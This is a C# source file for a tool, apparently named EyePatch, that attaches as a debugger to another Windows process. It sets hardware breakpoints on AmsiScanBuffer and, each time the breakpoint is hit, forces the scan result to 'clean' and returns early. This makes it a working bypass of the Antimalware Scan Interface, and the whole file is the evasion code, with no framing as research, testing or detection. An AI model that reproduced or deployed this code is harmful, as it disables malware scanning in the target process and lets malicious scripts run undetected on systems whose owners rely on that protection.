using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;

namespace EyePatch.Patch
{
    internal static class HardwareBreakpoint
    {


        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool ReadProcessMemory(
    IntPtr hProcess,
    IntPtr lpBaseAddress,
    byte[] lpBuffer,
    int dwSize,
    out IntPtr lpNumberOfBytesRead);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool WriteProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            byte[] lpBuffer,
            int nSize,
            out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        private static extern IntPtr LoadLibrary(string lpFileName);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool FreeLibrary(IntPtr hModule);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);






        private static Process _targetProcess;
        private static IntPtr _breakpointAddress;



        // Constants
        private const uint DBG_EXCEPTION_NOT_HANDLED = 0x80010001;
        private const uint DBG_CONTINUE = 0x00010002;



        private static CONTEXT64 CreateContext()
        {
            return new CONTEXT64
            {
                ContextFlags = CONTEXT_FLAGS.CONTEXT_ALL,
                FltSave = new XSAVE_FORMAT64
                {
                    FloatRegisters = new M128A[8],
                    XmmRegisters = new M128A[16],
                    Reserved4 = new byte[96]
                },
                VectorRegister = new M128A[26]
            };
        }



        private enum DebugEventCode : uint
        {
            CREATE_PROCESS_DEBUG_EVENT = 0x00000003,
            CREATE_THREAD_DEBUG_EVENT = 0x00000002,
            EXCEPTION_DEBUG_EVENT = 0x00000001,
            EXIT_PROCESS_DEBUG_EVENT = 0x00000005,
            EXIT_THREAD_DEBUG_EVENT = 0x00000004,
            LOAD_DLL_DEBUG_EVENT = 0x00000006,
            UNLOAD_DLL_DEBUG_EVENT = 0x00000007,
            OUTPUT_DEBUG_STRING_EVENT = 0x00000008,
            RIP_EVENT = 0x00000009
        }

        [Flags]
        private enum CONTEXT_FLAGS : uint
        {
            CONTEXT_AMD64 = 0x100000,
            CONTEXT_CONTROL = CONTEXT_AMD64 | 0x01,
            CONTEXT_INTEGER = CONTEXT_AMD64 | 0x02,
            CONTEXT_SEGMENTS = CONTEXT_AMD64 | 0x04,
            CONTEXT_FLOATING_POINT = CONTEXT_AMD64 | 0x08,
            CONTEXT_DEBUG_REGISTERS = CONTEXT_AMD64 | 0x10,
            CONTEXT_FULL = CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_FLOATING_POINT,
            CONTEXT_ALL = CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_SEGMENTS | CONTEXT_FLOATING_POINT | CONTEXT_DEBUG_REGISTERS
        }

        [StructLayout(LayoutKind.Sequential)]
        private unsafe struct DEBUG_EVENT
        {
            public uint dwDebugEventCode;
            public uint dwProcessId;
            public uint dwThreadId;
            public DEBUG_EVENT_UNION u;
        }

        [StructLayout(LayoutKind.Explicit, Size = 160)]
        private unsafe struct DEBUG_EVENT_UNION
        {
            [FieldOffset(0)]
            public EXCEPTION_DEBUG_INFO Exception;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct EXCEPTION_DEBUG_INFO
        {
            public EXCEPTION_RECORD ExceptionRecord;
            public uint dwFirstChance;
        }

        [StructLayout(LayoutKind.Sequential)]
        private unsafe struct EXCEPTION_RECORD
        {
            public uint ExceptionCode;
            public uint ExceptionFlags;
            public IntPtr ExceptionRecord;
            public IntPtr ExceptionAddress;
            public uint NumberParameters;

            public fixed ulong ExceptionInformation[15];
        }


        [StructLayout(LayoutKind.Sequential)]
        private struct M128A
        {
            public ulong Low;
            public long High;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 16)]
        private struct XSAVE_FORMAT64
        {
            public ushort ControlWord;
            public ushort StatusWord;
            public byte TagWord;
            public byte Reserved1;
            public ushort ErrorOpcode;
            public uint ErrorOffset;
            public ushort ErrorSelector;
            public ushort Reserved2;
            public uint DataOffset;
            public ushort DataSelector;
            public ushort Reserved3;
            public uint MxCsr;
            public uint MxCsr_Mask;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
            public M128A[] FloatRegisters;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
            public M128A[] XmmRegisters;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 96)]
            public byte[] Reserved4;
        }


        [StructLayout(LayoutKind.Sequential, Pack = 16)]
        private struct CONTEXT64
        {
            public ulong P1Home;
            public ulong P2Home;
            public ulong P3Home;
            public ulong P4Home;
            public ulong P5Home;
            public ulong P6Home;

            public CONTEXT_FLAGS ContextFlags;
            public uint MxCsr;

            public ushort SegCs;
            public ushort SegDs;
            public ushort SegEs;
            public ushort SegFs;
            public ushort SegGs;
            public ushort SegSs;
            public uint EFlags;

            public ulong Dr0;
            public ulong Dr1;
            public ulong Dr2;
            public ulong Dr3;
            public ulong Dr6;
            public ulong Dr7;

            public ulong Rax;
            public ulong Rcx;
            public ulong Rdx;
            public ulong Rbx;
            public ulong Rsp;
            public ulong Rbp;
            public ulong Rsi;
            public ulong Rdi;
            public ulong R8;
            public ulong R9;
            public ulong R10;
            public ulong R11;
            public ulong R12;
            public ulong R13;
            public ulong R14;
            public ulong R15;

            public ulong Rip;

            public XSAVE_FORMAT64 FltSave;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 26)]
            public M128A[] VectorRegister;

            public ulong VectorControl;

            public ulong DebugControl;
            public ulong LastBranchToRip;
            public ulong LastBranchFromRip;
            public ulong LastExceptionToRip;
            public ulong LastExceptionFromRip;
        }




        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool DebugActiveProcess(uint dwProcessId);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool WaitForDebugEvent(out DEBUG_EVENT lpDebugEvent, uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool ContinueDebugEvent(uint dwProcessId, uint dwThreadId, uint dwContinueStatus);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool DebugActiveProcessStop(uint dwProcessId);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr OpenThread(uint dwDesiredAccess, bool bInheritHandle, uint dwThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool CloseHandle(IntPtr hObject);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool GetThreadContext(IntPtr hThread, ref CONTEXT64 lpContext);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool SetThreadContext(IntPtr hThread, ref CONTEXT64 lpContext);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern uint SuspendThread(IntPtr hThread);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern uint ResumeThread(IntPtr hThread);



        private static volatile bool _debugLoopRunning;


        // Thread access flags
        private const uint THREAD_GET_CONTEXT = 0x00000008;
        private const uint THREAD_SET_CONTEXT = 0x00000010;
        private const uint THREAD_SUSPEND_RESUME = 0x00000002;

        // Exception codes
        private const uint EXCEPTION_SINGLE_STEP = 0x80000004;
        private const uint EXCEPTION_BREAKPOINT = 0x80000003;




        private static Action<string> _log = message => Console.WriteLine(message);

        private static void LogMessage(string message)
        {
            _log?.Invoke(message);
        }
        private static readonly ManualResetEventSlim _debugAttachReady = new ManualResetEventSlim(false);

        private static int _pendingPid;
        private static Exception _attachException;


        internal static void Invoke(int pid, Action<string> logger = null)
        {
            if (logger != null)
                _log = logger;

            if (_targetProcess != null)
                throw new InvalidOperationException("Debugger is already attached.");

            if (pid == Process.GetCurrentProcess().Id)
                throw new InvalidOperationException("Cannot attach debugger to current process.");

            _pendingPid = pid;
            _attachException = null;
            _debugAttachReady.Reset();

            _targetProcess = Process.GetProcessById(pid);
            _debugLoopRunning = true;

            Thread debugThread = new Thread(DebugLoop)
            {
                IsBackground = true
            };

            debugThread.Start();

            if (!_debugAttachReady.Wait(5000))
                throw new TimeoutException("Debugger attach did not finish.");

            if (_attachException != null)
                throw _attachException;

            SetupRemoteBreakpoint();

            LogMessage("Breakpoint installed. You can now type in the target console.");
        }
        internal static void Stop()
        {
            Cleanup();
        }

        private static IntPtr ResolveRemoteExport(Process process, string moduleName, string exportName)
        {
            IntPtr remoteBase = FindModuleInProcess(process, moduleName);
            if (remoteBase == IntPtr.Zero)
                throw new Exception($"{moduleName} not found in target process");

            IntPtr localModule = LoadLibrary(moduleName);
            if (localModule == IntPtr.Zero)
                throw new Win32Exception(Marshal.GetLastWin32Error(), $"Failed to load {moduleName} locally");

            try
            {
                IntPtr localExport = GetProcAddress(localModule, exportName);
                if (localExport == IntPtr.Zero)
                    throw new Win32Exception(Marshal.GetLastWin32Error(), $"Failed to resolve {exportName}");

                long rva = localExport.ToInt64() - localModule.ToInt64();
                return new IntPtr(remoteBase.ToInt64() + rva);
            }
            finally
            {
                FreeLibrary(localModule);
            }
        }
        private static readonly HashSet<uint> _patchedThreads = new HashSet<uint>();
        private static void SetupRemoteBreakpoint()
        {
            IntPtr AmsiBufferAddress = ResolveRemoteExport(
                _targetProcess,
                "Amsi.dll",
                "AmsiScanBuffer");

            _breakpointAddress = AmsiBufferAddress;

            LogMessage($"Setting hardware breakpoint at 0x{AmsiBufferAddress.ToInt64():X}");
            int installed = 0;

            foreach (ProcessThread thread in _targetProcess.Threads)
            {
                uint threadId = (uint)thread.Id;

                IntPtr hThread = OpenThread(
                    THREAD_GET_CONTEXT | THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME,
                    false,
                    threadId);

                if (hThread == IntPtr.Zero)
                    continue;

                bool suspended = false;

                try
                {
                    if (SuspendThread(hThread) == 0xFFFFFFFF)
                        continue;

                    suspended = true;

                    CONTEXT64 context = CreateContext();

                 


                    if (!GetThreadContext(hThread, ref context))
                        continue;

                    _patchedThreads.Add(threadId);

                    EnableBreakpoint(ref context, AmsiBufferAddress, 0);

                    if (!SetThreadContext(hThread, ref context))
                        continue;

                    installed++;
                }
                finally
                {
                    if (suspended)
                        ResumeThread(hThread);

                    CloseHandle(hThread);
                }
            }

            if (installed == 0)
                throw new InvalidOperationException("Failed to install hardware breakpoint on any target thread.");

            LogMessage($"Hardware breakpoint installed on {installed} thread(s).");
        }

        private static void DebugLoop()
        {
            LogMessage("Debug loop started.");

            try
            {
                if (!DebugActiveProcess((uint)_pendingPid))
                {
                    _attachException = new Win32Exception(
                        Marshal.GetLastWin32Error(),
                        "Failed to attach debugger");

                    _debugAttachReady.Set();
                    return;
                }

                LogMessage($"Debugger attached to process {_pendingPid}");
            }
            catch (Exception ex)
            {
                _attachException = ex;
                _debugAttachReady.Set();
                return;
            }

            while (_debugLoopRunning)
            {
                DEBUG_EVENT debugEvent;

                if (!WaitForDebugEvent(out debugEvent, 100))
                {
                    int error = Marshal.GetLastWin32Error();

                    if (error != 121)
                        LogMessage($"WaitForDebugEvent failed: {error}");

                    continue;
                }

                uint continueStatus = DBG_CONTINUE;
                bool signalAttachReady = !_debugAttachReady.IsSet;

                try
                {
                    if (debugEvent.dwDebugEventCode == (uint)DebugEventCode.EXIT_PROCESS_DEBUG_EVENT)
                    {
                        LogMessage("Target process exited. Clearing hook state.");

                        _debugLoopRunning = false;
                        _breakpointAddress = IntPtr.Zero;
                        _patchedThreads.Clear();
                        _targetProcess = null;

                        continueStatus = DBG_CONTINUE;
                    }
                    else if (debugEvent.dwDebugEventCode == (uint)DebugEventCode.EXCEPTION_DEBUG_EVENT)
                    {
                        uint code = debugEvent.u.Exception.ExceptionRecord.ExceptionCode;
                        IntPtr address = debugEvent.u.Exception.ExceptionRecord.ExceptionAddress;

                        if (code == EXCEPTION_BREAKPOINT)
                        {
                            LogMessage("Initial breakpoint continued.");
                            continueStatus = DBG_CONTINUE;
                        }
                        else if (code == EXCEPTION_SINGLE_STEP)
                        {
                            if (_breakpointAddress != IntPtr.Zero &&
                                address == _breakpointAddress &&
                                HandleBreakpoint(debugEvent))
                            {
                                continueStatus = DBG_CONTINUE;
                            }
                            else
                            {
                                continueStatus = DBG_EXCEPTION_NOT_HANDLED;
                            }
                        }
                        else
                        {
                            continueStatus = DBG_EXCEPTION_NOT_HANDLED;
                        }
                    }
                }
                catch (Exception ex)
                {
                    LogMessage("Debug loop error: " + ex.Message);
                    continueStatus = DBG_EXCEPTION_NOT_HANDLED;
                }
                finally
                {
                    ContinueDebugEvent(
                        debugEvent.dwProcessId,
                        debugEvent.dwThreadId,
                        continueStatus);

                    if (signalAttachReady && !_debugAttachReady.IsSet)
                        _debugAttachReady.Set();
                }
            }

            LogMessage("Debug loop stopped.");
        }
        private static ulong ReadUInt64Remote(IntPtr hProcess, IntPtr address)
        {
            byte[] buffer = new byte[8];

            if (!ReadProcessMemory(hProcess, address, buffer, buffer.Length, out _))
                throw new Win32Exception(Marshal.GetLastWin32Error(), "ReadProcessMemory failed");

            return BitConverter.ToUInt64(buffer, 0);
        }

        private static IntPtr ReadIntPtrRemote(IntPtr hProcess, IntPtr address)
        {
            ulong value = ReadUInt64Remote(hProcess, address);
            return new IntPtr(unchecked((long)value));
        }

        private static void WriteInt32Remote(IntPtr hProcess, IntPtr address, int value)
        {
            byte[] buffer = BitConverter.GetBytes(value);

            if (!WriteProcessMemory(hProcess, address, buffer, buffer.Length, out _))
                throw new Win32Exception(Marshal.GetLastWin32Error(), "WriteProcessMemory failed");
        }

        private const int Amsi_Result_Clean = 0;

        private static bool IsCanonicalUserAddress(ulong address)
        {
            return address >= 0x10000UL &&
                   address <= 0x00007FFFFFFFFFFFUL;
        }

        private static bool IsPlausibleStackPointer(ulong rsp)
        {
            return IsCanonicalUserAddress(rsp) &&
                   (rsp % 8UL) == 0;
        }


        private static bool HandleBreakpoint(DEBUG_EVENT debugEvent)
        {
            var exception = debugEvent.u.Exception.ExceptionRecord;

            if (exception.ExceptionAddress != _breakpointAddress)
                return false;

            IntPtr hThread = OpenThread(
                THREAD_GET_CONTEXT | THREAD_SET_CONTEXT,
                false,
                debugEvent.dwThreadId);

            if (hThread == IntPtr.Zero)
                return false;

            try
            {
                CONTEXT64 context = CreateContext();

                if (!GetThreadContext(hThread, ref context))
                    return false;

                IntPtr hProcess = _targetProcess.Handle;

                if (!IsPlausibleStackPointer(context.Rsp))
                    return false;

                ulong returnAddress = ReadUInt64Remote(
                    hProcess,
                    new IntPtr(unchecked((long)context.Rsp)));

                if (!IsCanonicalUserAddress(returnAddress))
                    return false;

                ulong resultSlot = context.Rsp + (6UL * 8UL);

                if (!IsCanonicalUserAddress(resultSlot))
                    return false;

                IntPtr resultPtr = ReadIntPtrRemote(
                    hProcess,
                    new IntPtr(unchecked((long)resultSlot)));

                ulong resultAddress = unchecked((ulong)resultPtr.ToInt64());

                if (!IsCanonicalUserAddress(resultAddress))
                    return false;

                if (resultPtr != IntPtr.Zero)
                    WriteInt32Remote(hProcess, resultPtr, Amsi_Result_Clean);

                context.Rip = returnAddress;
                context.Rsp += 8;
                context.Rax = 0;
                context.Dr6 = 0;

                DisableBreakpoint(ref context, 0);

                if (!SetThreadContext(hThread, ref context))
                    return false;

                LogMessage("Breakpoint handled.");

                return true;
            }
            finally
            {
                CloseHandle(hThread);
            }
        }
        private static void EnableBreakpoint(ref CONTEXT64 context, IntPtr address, int index)
        {
            if ((uint)index > 3)
                throw new ArgumentOutOfRangeException(nameof(index));

            ulong addr = (ulong)address.ToInt64();

            switch (index)
            {
                case 0: context.Dr0 = addr; break;
                case 1: context.Dr1 = addr; break;
                case 2: context.Dr2 = addr; break;
                case 3: context.Dr3 = addr; break;
            }

            // Clear RW/LEN fields for all hardware breakpoints
            context.Dr7 = SetBits(context.Dr7, 16, 16, 0);

            // Enable local breakpoint for selected DR index
            context.Dr7 = SetBits(context.Dr7, index * 2, 1, 1);

            // Clear debug status
            context.Dr6 = 0;
        }

        private static void DisableBreakpoint(ref CONTEXT64 context, int index)
        {
            if ((uint)index > 3)
                throw new ArgumentOutOfRangeException(nameof(index));

            ulong mask = 1UL << (index * 2);
            context.Dr7 &= ~mask;

            // Clear the address register
            switch (index)
            {
                case 0: context.Dr0 = 0; break;
                case 1: context.Dr1 = 0; break;
                case 2: context.Dr2 = 0; break;
                case 3: context.Dr3 = 0; break;
            }
        }

        private static ulong SetBits(ulong value, int lowBit, int bits, ulong newValue)
        {
            if (bits <= 0 || bits > 64)
                throw new ArgumentOutOfRangeException(nameof(bits));

            if (lowBit < 0 || lowBit >= 64)
                throw new ArgumentOutOfRangeException(nameof(lowBit));

            if (lowBit + bits > 64)
                throw new ArgumentOutOfRangeException(nameof(bits));

            ulong mask = bits == 64 ? ulong.MaxValue : (1UL << bits) - 1UL;

            value &= ~(mask << lowBit);
            value |= (newValue & mask) << lowBit;

            return value;
        }

        private static IntPtr FindModuleInProcess(Process process, string moduleName)
        {
            foreach (ProcessModule module in process.Modules)
            {
                if (module.ModuleName.Equals(moduleName, StringComparison.OrdinalIgnoreCase))
                    return module.BaseAddress;
            }
            return IntPtr.Zero;
        }




        private static void Cleanup()
        {
            Process target = _targetProcess;

            _debugLoopRunning = false;

            if (target == null)
                return;

            try
            {
                foreach (uint threadId in _patchedThreads)
                {
                    IntPtr hThread = OpenThread(
                        THREAD_GET_CONTEXT | THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME,
                        false,
                        threadId);

                    if (hThread == IntPtr.Zero)
                        continue;

                    bool suspended = false;

                    try
                    {
                        if (SuspendThread(hThread) != 0xFFFFFFFF)
                        {
                            suspended = true;

                            CONTEXT64 context = CreateContext();

                            if (GetThreadContext(hThread, ref context))
                            {
                                context.Dr0 = 0;
                                context.Dr1 = 0;
                                context.Dr2 = 0;
                                context.Dr3 = 0;
                                context.Dr6 = 0;
                                context.Dr7 = 0;

                                SetThreadContext(hThread, ref context);
                            }
                        }
                    }
                    finally
                    {
                        if (suspended)
                            ResumeThread(hThread);

                        CloseHandle(hThread);
                    }
                }

                _patchedThreads.Clear();

                if (!DebugActiveProcessStop((uint)target.Id))
                {
                    int error = Marshal.GetLastWin32Error();

                    if (error != 6)
                        LogMessage($"DebugActiveProcessStop failed: {error}");
                }
            }
            catch (Exception ex)
            {
                LogMessage($"Error during cleanup: {ex.Message}");
            }
            finally
            {
                _targetProcess = null;
                _breakpointAddress = IntPtr.Zero;
            }
        }







    }
}